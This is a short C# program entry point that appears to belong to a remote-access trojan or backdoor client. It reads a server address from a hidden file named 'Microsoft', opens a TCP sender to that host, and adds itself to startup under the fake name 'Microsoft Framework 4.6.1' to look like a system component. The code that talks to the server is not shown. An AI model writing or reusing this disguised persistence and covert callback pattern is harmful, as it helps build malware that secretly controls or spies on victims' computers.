using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace App
{
    class Program
    {
        static void Main(string[] args)
        {
            Sender.TCP.Sender sender = new Sender.TCP.Sender(GetIp());
            Sender.Domain.Domain domain = new Sender.Domain.Domain(sender);
            Sender.AutoOn.AutoOn.SetAutorunValue(true, "Microsoft Framework 4.6.1");
            domain.Run();
        }

        private static string GetIp()
        {
            if (!System.IO.File.Exists(AppDomain.CurrentDomain.BaseDirectory + @"\Microsoft"))
                System.IO.File.Create(AppDomain.CurrentDomain.BaseDirectory + @"\Microsoft").Close();

            using (StreamReader streamReader = new StreamReader(AppDomain.CurrentDomain.BaseDirectory + @"\Microsoft"))
            {
                var i = streamReader.ReadLine();
                return i;
            }
        }
    }
}
